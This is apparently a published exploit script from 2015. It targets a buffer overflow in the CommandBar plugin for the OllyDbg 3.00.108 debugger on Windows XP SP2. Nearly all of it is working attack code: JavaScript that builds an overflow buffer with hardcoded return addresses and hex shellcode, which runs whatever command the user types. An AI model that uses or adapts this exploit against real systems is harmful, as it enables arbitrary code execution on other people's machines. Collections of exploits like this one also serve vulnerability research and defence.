# -*- coding: utf-8 -*-
# Exploit Title: Vulnerability Buffer Overflow  in Plugin CommandBar for ollydbg
# Date: 28/01/2015
# Exploit Author: Hykatza
# Software Link: http://www.openrce.org/downloads/download_file/105
# Version: 3.00.108
# Tested on: Windows XP SP2
var exploit=(function(){
  limit=218;
  eip="\x41\xB1\xD3\x77";
  junk="\x41".repeat(3)+eip+"\x41".repeat(4)
  preshellcode="\xcc".repeat(4);
  lc=3;
  function run(){
  cmd=prompt("Ingresa comando a ejecutar");
  if(cmd.length<3){
    lc=0x1c-(lc-cmd.length);
  }
  else if(cmd.length>3){
    lc=0x1c+(cmd.length-lc);
  }
  else{
    lc=0x1c;
  }
  cmd1=String.fromCharCode(lc.toString(16));
  shellcode="\x33\xC0\x89\x44\x24"+cmd1+
             "\xeB\x02\xBA\xC7\x93"+
             "\xBF\x77\xFF\xD2\xCC"+
             "\xE8\xF3\xFF\xFF\xFF"+cmd;
  shellcode=preshellcode+shellcode;
  shellcode=shellcode+"\xcc".repeat(218-shellcode.length);
  eip2="\x74\x80\x97\x7c";
  alph="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  min=0;
  max=alph.length;
  rand=Math.round(Math.random() * (max - min) + min);
  char=alph[rand];
  restbuffer=char.repeat(16)+eip2;
  buffer=junk+shellcode;
  data=buffer+restbuffer;
  console.log(data);
  document.write(data);
  }
  return {
    "run":function(){return run()}
  }
})();
